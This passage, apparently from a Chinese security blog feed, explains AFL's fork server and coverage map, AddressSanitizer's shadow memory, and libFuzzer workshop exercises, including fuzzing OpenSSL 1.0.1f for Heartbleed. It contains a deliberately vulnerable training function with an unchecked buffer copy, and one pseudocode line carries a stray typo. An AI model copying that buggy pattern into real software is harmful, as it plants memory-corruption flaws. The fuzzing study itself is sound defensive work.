<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  fsrv_st_fd  = st_pipe[0]</span><br><span class="line">...</span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, 4);</span><br><span class="line">...</span><br><span class="line">  /* If we have a four-byte &quot;hello&quot; message from the server, we&apos;re all set. Otherwise, try to figure out what went wrong. */</span><br><span class="line"></span><br><span class="line">  if (rlen == 4) &#123;</span><br><span class="line">    OKF(&quot;All right - fork server is up.&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h3><span id="共享内存">共享内存</span></h3><p>作为fuzzer，AFL并不是像无头苍蝇那样对输入文件无脑地随机变化（其实也支持这种方式，即dumb模式），其最大特点就是会对target进行插桩，以辅助mutated input的生成。具体地，插桩后的target，会记录执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。</p><p>AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。具体地，fuzzer在启动时，会执行setup_shm()方法进行配置。其首先调用shemget()分配一块共享内存，大小MAP_SIZE为64K:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600);</span><br></pre></td></tr></table></figure></p><p>分配成功后，该共享内存的标志符会被设置到环境变量中，从而之后fork()得到的子进程可以通过该环境变量，得到这块共享内存的标志符：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shm_str = alloc_printf(&quot;%d&quot;, shm_id);</span><br><span class="line">if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1);</span><br></pre></td></tr></table></figure></p><p>并且，fuzzer本身，会使用变量trace_bits来保存共享内存的地址：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trace_bits = shmat(shm_id, NULL, 0);</span><br></pre></td></tr></table></figure></p><p>在每次target执行之前，fuzzer首先将该共享内容清零：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset(trace_bits, 0, MAP_SIZE);</span><br></pre></td></tr></table></figure></p><p>接下来，我们再来看看target是如何获取并使用这块共享内存的。相关代码同样也在上面提到的方法__afl_maybe_log()中。首先，会检查是否已经将共享内存映射完成：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3><span id="分支信息的记录">分支信息的记录</span></h3><p>[warning] AFL 保存的是 edges 执行次数而不是 blocks 执行次数,AFL是根据二元tuple(跳转的源地址和目标地址)来记录分支信息，从而获取target的执行流程和代码覆盖情况，其伪代码如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; 1;</span><br></pre></td></tr></table></figure></p><p>其中的代码在上述源码分析中可以找到（包含llvm_pass）</p><h3><span id="afl文件变异">AFL文件变异</span></h3><p>这一部分先挖坑，因为没有具体阅读源码，只是收集到的资料，源码部分之后会补上</p><h4><span id="bitflip">bitflip</span></h4><ul><li>[自动检测token]: 在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</li><li>[生成effector map]: 在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</li></ul><h4><span id="arithmetic">arithmetic</span></h4><p>加减</p><h4><span id="interest">interest</span></h4><p>特殊语料库的替换</p><h4><span id="dictionary">dictionary</span></h4><h4><span id="havoc">havoc</span></h4><h4><span id="splice">splice</span></h4><h4><span id="cycle">cycle</span></h4><h3><span id="一个afl优化策略">一个AFL优化策略</span></h3><p>引用：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">为此，我对ELF文件变异和objdump执行路径变异进行了简单的试验，发现许多”数据“bytes被翻</span><br><span class="line">转后，确实能够引起执行路径的变化。但是，这些”数据“bytes往往是一块块分布在文件中的，</span><br><span class="line">而每一块”数据“中的每个bytes被翻转后，执行路径往往是相同的。所以，我们就有了一个朴素</span><br><span class="line">的想法：如果翻转一个byte引起执行路径变化，而且翻转该byte与翻转其前一个byte的执行路</span><br><span class="line">径不同，此时才将其视为“有效”的。</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Basic-Analysis-of-AFL&quot;&gt;&lt;a href=&quot;#Intro-Basic-Analysis-of-AFL&quot; class=&quot;headerlink&quot; title=&quot;Intro: Basic Analysis of AFL&quot;&gt;&lt;/a&gt;Intro: Basic Analysis of AFL&lt;/h2&gt;
    
    </summary>
    
      <category term="fuzz" scheme="http://p1umer.gituhb.io/categories/fuzz/"/>
    
    
      <category term="Fuzz" scheme="http://p1umer.gituhb.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>libfuzzer &amp; LLVM 初探</title>
    <link href="http://p1umer.gituhb.io/2019/02/20/libfuzzer%20&amp;%20LLVM%20%E5%88%9D%E6%8E%A2/"/>
    <id>http://p1umer.gituhb.io/2019/02/20/libfuzzer &amp; LLVM 初探/</id>
    <published>2019-02-20T07:00:54.000Z</published>
    <updated>2019-07-04T16:25:23.627Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-analysis-of-libfuzzer-ampamp-llvm">Intro: Analysis of libfuzzer &amp;&amp; LLVM</span></h2> <a id="more"></a><h2><span id="libfuzzer-build">libfuzzer build</span></h2><h3><span id="编译流程">编译流程</span></h3><p>环境Ubuntu16.04<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dor1s/libfuzzer-workshop.git</span><br><span class="line">sudo sh checkout_build_install_llvm.sh</span><br><span class="line">sudo apt-get install -ymake autoconf automake libtool pkg-config zlib1g-dev</span><br><span class="line">cd libfuzzer-workshop/libFuzzer</span><br><span class="line">Fuzzer/build.sh</span><br></pre></td></tr></table></figure></p><p>【+】<a href="https://github.com/Dor1s/libfuzzer-workshop/" target="_blank" rel="noopener">libfuzzer-workship</a></p><h3><span id="趁着编译的时候去详细了解一下libfuzzer其中的内存监控算法">趁着编译的时候去详细了解一下libfuzzer其中的内存监控算法</span></h3><p>【+】<a href="http://clang.llvm.org/docs/AddressSanitizer.html" target="_blank" rel="noopener">AddressSanitizer</a></p><p>【+】<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm" target="_blank" rel="noopener">AddressSanitizer 分析</a></p><p>【+】<a href="https://blog.csdn.net/pang241/article/details/76137969" target="_blank" rel="noopener">AddressSanitizer csdn</a></p><p>The run-time library replaces the malloc and free functions. The memory around malloc-ed regions (red zones) is poisoned. The free-ed memory is placed in quarantine and also poisoned. ==Every memory access in the program is transformed by the compiler in the following way:==</p><p>Before: 变量赋值<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*address = ...;  // or: ... = *address;</span><br></pre></td></tr></table></figure></p><p>After：加上检测<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (IsPoisoned(address)) &#123;</span><br><span class="line">  ReportError(address, kAccessSize, kIsWrite);</span><br><span class="line">&#125;</span><br><span class="line">*address = ...;  // or: ... = *address;</span><br></pre></td></tr></table></figure></p><p>Memory mapping and Instrumentation</p><ul><li>shadwos 和 main memory</li><li>编译器进行了如下插桩<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shadow_address = MemToShadow(address);</span><br><span class="line">if (ShadowIsPoisoned(shadow_address)) &#123;</span><br><span class="line">  Repozhuang&apos;tai&apos;yrtError(address, kAccessSize, kIsWrite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>并且针对shadows的one byte进行了与main memory的状态映射<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">byte *shadow_address = MemToShadow(address);</span><br><span class="line">byte shadow_value = *shadow_address;</span><br><span class="line">if (shadow_value) &#123;</span><br><span class="line">  if (SlowPathCheck(shadow_value, address, kAccessSize)) &#123;</span><br><span class="line">    ReportError(address, kAccessSize, kIsWrite);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check the cases where we access first k bytes of the qword</span><br><span class="line">// and these k bytes are unpoisoned.</span><br><span class="line">bool SlowPathCheck(shadow_value, address, kAccessSize) &#123;</span><br><span class="line">  last_accessed_byte = (address &amp; 7) + kAccessSize - 1;</span><br><span class="line">  return (last_accessed_byte &gt;= shadow_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>针对全内存，判断poison==0 ：fastpath</p><p>针对非全内存，SlowPathCheck，(last_accessed_byte:最后写入的数据大小；shadow_value：能写入的数据大小)</p><p>针对部分fastpath不能满足的非对齐oob访问，我的想法是干脆放弃fastpath转用slowpath，结果看了issue发现确实是这样，但是有一定的性能损耗，得不偿失。</p><p>研究这部分算法也是得不偿失然鹅。。</p><p>对于栈做了如下插桩：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void foo() &#123;</span><br><span class="line">  char redzone1[32];  // 32-byte aligned</span><br><span class="line">  char a[8];          // 32-byte aligned</span><br><span class="line">  char redzone2[24];</span><br><span class="line">  char redzone3[32];  // 32-byte aligned</span><br><span class="line">  int  *shadow_base = MemToShadow(redzone1);</span><br><span class="line">  shadow_base[0] = 0xffffffff;  // poison redzone1</span><br><span class="line">  shadow_base[1] = 0xffffff00;  // poison redzone2, unpoison &apos;a&apos;</span><br><span class="line">  shadow_base[2] = 0xffffffff;  // poison redzone3</span><br><span class="line">  ...</span><br><span class="line">  shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3><span id="addresssanitize-源码分析">addresssanitize 源码分析：</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bool AddressSanitizerModule::runOnModule(Module &amp;M) &#123;</span><br><span class="line">  C = &amp;(M.getContext());</span><br><span class="line">  int LongSize = M.getDataLayout().getPointerSizeInBits();</span><br><span class="line">  IntptrTy = Type::getIntNTy(*C, LongSize);</span><br><span class="line">  TargetTriple = Triple(M.getTargetTriple());</span><br><span class="line">  Mapping = getShadowMapping(TargetTriple, LongSize, CompileKernel);</span><br><span class="line">  initializeCallbacks(M);</span><br><span class="line"></span><br><span class="line">  if (CompileKernel)</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  // Create a module constructor. A destructor is created lazily because not all</span><br><span class="line">  // platforms, and not all modules need it.</span><br><span class="line">  std::string VersionCheckName =</span><br><span class="line">      kAsanVersionCheckNamePrefix + std::to_string(GetAsanVersion(M));</span><br><span class="line">  std::tie(AsanCtorFunction, std::ignore) = createSanitizerCtorAndInitFunctions(</span><br><span class="line">      M, kAsanModuleCtorName, kAsanInitName, /*InitArgTypes=*/&#123;&#125;,</span><br><span class="line">      /*InitArgs=*/&#123;&#125;, VersionCheckName);</span><br><span class="line"></span><br><span class="line">  bool CtorComdat = true;</span><br><span class="line">  bool Changed = false;</span><br><span class="line">  // TODO(glider): temporarily disabled globals instrumentation for KASan.</span><br><span class="line">  if (ClGlobals) &#123;</span><br><span class="line">    IRBuilder&lt;&gt; IRB(AsanCtorFunction-&gt;getEntryBlock().getTerminator());</span><br><span class="line">    Changed |= InstrumentGlobals(IRB, M, &amp;CtorComdat);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Put the constructor and destructor in comdat if both</span><br><span class="line">  // (1) global instrumentation is not TU-specific</span><br><span class="line">  // (2) target is ELF.</span><br><span class="line">  if (UseCtorComdat &amp;&amp; TargetTriple.isOSBinFormatELF() &amp;&amp; CtorComdat) &#123;</span><br><span class="line">    AsanCtorFunction-&gt;setComdat(M.getOrInsertComdat(kAsanModuleCtorName));</span><br><span class="line">    appendToGlobalCtors(M, AsanCtorFunction, kAsanCtorAndDtorPriority,</span><br><span class="line">                        AsanCtorFunction);</span><br><span class="line">    if (AsanDtorFunction) &#123;</span><br><span class="line">      AsanDtorFunction-&gt;setComdat(M.getOrInsertComdat(kAsanModuleDtorName));</span><br><span class="line">      appendToGlobalDtors(M, AsanDtorFunction, kAsanCtorAndDtorPriority,</span><br><span class="line">                          AsanDtorFunction);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    appendToGlobalCtors(M, AsanCtorFunction, kAsanCtorAndDtorPriority);</span><br><span class="line">    if (AsanDtorFunction)</span><br><span class="line">      appendToGlobalDtors(M, AsanDtorFunction, kAsanCtorAndDtorPriority);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return Changed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="sum">sum</span></h3><ul><li>内存监控围绕 RZ 插桩来实现</li><li>对一些内存的状态进行shadow的映射，访问的时候进行状态检测</li></ul><p>libfuzzer貌似编译完了，我去看看</p><h3><span id="radamsa">radamsa</span></h3><p>【+】<a href="http://www.cs.tut.fi/tapahtumat/testaus12/kalvot/Wieser_20120606radamsa-coverage.pdf" target="_blank" rel="noopener">radamsa</a></p><h3><span id="学习libfuzzer中遇到的种种">学习libfuzzer中遇到的种种：</span></h3><ul><li>有corpus</li><li>LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)的data是随机的，但size需要自己设置 max_len.</li><li><a href="https://clang.llvm.org/docs/SanitizerCoverage.html" target="_blank" rel="noopener">libfuzzer option 指北</a></li><li>编译时用到的参数可以在 clang -help 中查看</li><li>-fsanitize=address： 表示使用 AddressSanitizer</li><li>-fsanitize-coverage=trace-pc-guard: 为 libfuzzer 提供代码覆盖率信息</li><li>Seed: 1608565063 说明这次的种子数据</li><li>-max_len is not provided, using 64 ， -max_len 用于设置最大的数据长度，默认为 64</li><li>ASAN_OPTIONS=symbolize=1 ./first_fuzzer ./crash-id 显示栈</li><li>简单来说，如果我们要 fuzz 一个程序，找到一个入口函数，然后利用LLVMFuzzerTestOneInput就可以完成基本功能，然鹅：</li><li>我发现libfuzzer-interface还有几个接口类似于LLVMFuzzerCustomMutator。</li></ul><h3><span id="练习写第一个fuzzer">练习写第一个fuzzer</span></h3><h4><span id="代码">代码：</span></h4><p>测试最基本的溢出</p><h4><span id="编译选项">编译选项：</span></h4><p>【+】 -fsanitize=fuzzer: 代码覆盖率</p><p>【+】 -fsanitize=address：启用 AddressSanitizer</p><p>【+】 -g：详细调试信息</p><h4><span id="运行选项">运行选项：</span></h4><p>【+】 -seed：制定随机数 </p><p>【+】 -max_len：指定 Data 最大长度</p><p>【+】 +dir: 指定 corpus</p><h3><span id="第二个">第二个</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">constexpr auto kMagicHeader = &quot;ZN_2016&quot;;</span><br><span class="line">constexpr std::size_t kMaxPacketLen = 1024;</span><br><span class="line">constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);</span><br><span class="line"></span><br><span class="line">bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) &#123;</span><br><span class="line">  if (size &lt; sizeof(kMagicHeader))</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader));</span><br><span class="line"></span><br><span class="line">  std::array&lt;uint8_t, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  if (strcmp(kMagicHeader, header.c_str()))</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  auto target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  if (size &gt; kMaxPacketLen)</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  if (!verify_hash)</span><br><span class="line">    return true;</span><br><span class="line"></span><br><span class="line">  std::copy(data, data + size, body.data());</span><br><span class="line">  auto real_hash = DummyHash(body);</span><br><span class="line">  return real_hash == target_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fuzzer_code：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;vulnerable_functions.h&quot;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123;</span><br><span class="line">  VulnerableFunction2(data, size, true);</span><br><span class="line">  VulnerableFunction2(data, size, false);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有个tip：bool类型的变量太好遍历了，为了覆盖率测试两次就好:)</p><p>但是会如何影响覆盖率呢？是不是覆盖的呢？</p><p>试一试把原函数中return true去掉，fuzzer.cc换成：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;vulnerable_functions.h&quot;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123;</span><br><span class="line">  VulnerableFunction2(data, size, false);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>覆盖率25，上一个覆盖率也是25（均crash）</p><p>再去掉<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!verify_hash)</span><br></pre></td></tr></table></figure></p><p>覆盖率降为24</p><p>wow很清晰：覆盖率就是整个fuzzer一趟测试触及的 basic-block 总个数。</p><h3><span id="第三个">第三个</span></h3><p>加了一个&amp; :<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;</span><br><span class="line"></span><br><span class="line">bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) &#123;</span><br><span class="line">  bool verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  return VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么还是遍历一下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123;</span><br><span class="line"></span><br><span class="line">  VulnerableFunction3(data, size, 0x00);</span><br><span class="line">  VulnerableFunction3(data, size, 0x1001);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>crash:)</p><h3><span id="第四个">第四个</span></h3><p>写到这里想到，写fuzz的目的就是crashcrashcrash，所以尽可能调整fuzz代码达到crash即可，没必要局限于格式。</p><p>开始第四个CVE-2014-0160:</p><h4><span id="build">build</span></h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar xzf openssl1.0.1f.tgz</span><br><span class="line">cd openssl1.0.1f/</span><br><span class="line"></span><br><span class="line">./config</span><br><span class="line">make clean</span><br><span class="line">make CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot; -j$(nproc)</span><br></pre></td></tr></table></figure><p>fuzzer.cc:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// Copyright 2016 Google Inc. All Rights Reserved.</span><br><span class="line">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">#include &lt;openssl/ssl.h&gt;</span><br><span class="line">#include &lt;openssl/err.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef CERT_PATH</span><br><span class="line"># define CERT_PATH</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123;</span><br><span class="line">  SSL_library_init();</span><br><span class="line">  SSL_load_error_strings();</span><br><span class="line">  ERR_load_BIO_strings();</span><br><span class="line">  OpenSSL_add_all_algorithms();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  assert (sctx = SSL_CTX_new(TLSv1_method()));</span><br><span class="line">  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line">  BIO_write(sinbio, Data, Size);</span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译选项：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div     -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a     ../../libFuzzer/libFuzzer.a -o openssl_fuzzer</span><br></pre></td></tr></table></figure></p><p>跑出来了好几次 oom 和 leakmem ？</p><ul><li>去掉 leak</li><li>扩大内存<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./openssl_fuzzer -detect_leaks=0 -rss_limit_mb=4096</span><br></pre></td></tr></table></figure></li></ul><p>花了一分钟才跑出来crash，why？？？</p><p>如果把初始化api分开来看呢？<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// Copyright 2016 Google Inc. All Rights Reserved.</span><br><span class="line">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">#include &lt;openssl/ssl.h&gt;</span><br><span class="line">#include &lt;openssl/err.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef CERT_PATH</span><br><span class="line"># define CERT_PATH</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">SSL_CTX *Init() &#123;</span><br><span class="line">  SSL_library_init();</span><br><span class="line">  SSL_load_error_strings();</span><br><span class="line">  ERR_load_BIO_strings();</span><br><span class="line">  OpenSSL_add_all_algorithms();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  assert (sctx = SSL_CTX_new(TLSv1_method()));</span><br><span class="line">  /* These two file were created with this command:</span><br><span class="line">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span><br><span class="line">     -out server.pem -days 9999 -nodes -subj /CN=a/</span><br><span class="line">  */</span><br><span class="line">  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  return sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; 